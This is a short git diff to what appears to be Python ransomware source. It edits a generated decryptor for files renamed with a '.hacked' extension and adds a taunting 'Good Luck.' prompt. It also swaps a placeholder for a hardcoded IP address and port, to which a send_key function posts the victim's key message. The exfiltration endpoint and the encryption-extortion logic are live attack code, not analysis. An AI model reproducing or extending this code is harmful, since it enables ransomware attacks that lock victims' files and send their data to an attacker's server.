@@ -116,7 +116,7 @@ encrypted_files = search_file('C:\\\\test', ['.hacked'])
 
 cipher = Fernet(key)
 for encrypted_file in encrypted_files:
-    decrypted_file = encrypted_file.replace('.hacked', '')
+    decrypted_file = (encrypted_file.rsplit('.hacked',1))[0]
 
     with open(encrypted_file, "rb") as encrypted_target:
         decrypted_data = cipher.decrypt(encrypted_target.read())
@@ -130,6 +130,7 @@ print("Decode process completed.")
         """
         f.write(code)
 
+    input("Good Luck.")
     return
 
 def make_id():
@@ -146,7 +147,7 @@ def send_key(text):
     @param : 전송할 메시지
     @return : None
     """
-    url = "SECRET"
+    url = 'http://180.64.207.217:9999//write.php'
     data = {'message': text}
     response = requests.post(url, data=data)
     print(response.text)
